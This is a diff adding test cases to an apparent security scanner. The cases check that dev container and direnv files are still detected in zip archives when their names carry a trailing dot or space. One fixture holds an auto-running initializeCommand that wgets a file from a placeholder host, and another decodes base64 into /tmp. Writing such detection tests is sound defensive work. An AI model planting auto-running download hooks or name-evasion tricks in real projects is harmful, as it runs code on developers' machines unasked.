@@ -361,6 +361,19 @@ def cases() -> list[tuple[str, bytes, str | None]]:
             ),
             "dev_devcontainer_lifecycle",
         ),
+        (
+            "trailing-dot-devcontainer.zip",
+            _zip(
+                "repo/.devcontainer/devcontainer.json. ",
+                b'{"initializeCommand": "wget -qO /tmp/i https://example.invalid/i"}',
+            ),
+            "dev_devcontainer_lifecycle",
+        ),
+        (
+            "trailing-dot-envrc.zip",
+            _zip("repo/.envrc.", b"echo aW5lcnQ= | base64 -d > /tmp/x\n"),
+            "dev_envrc_exec",
+        ),
         # The same bytes under another name are not a dev container or direnv file.
         ("init.json", b'{"initializeCommand": "wget -qO /tmp/i https://example.invalid/i"}', None),
         ("envrc.sh", b"echo aW5lcnQ= | base64 -d > /tmp/x\n", None),
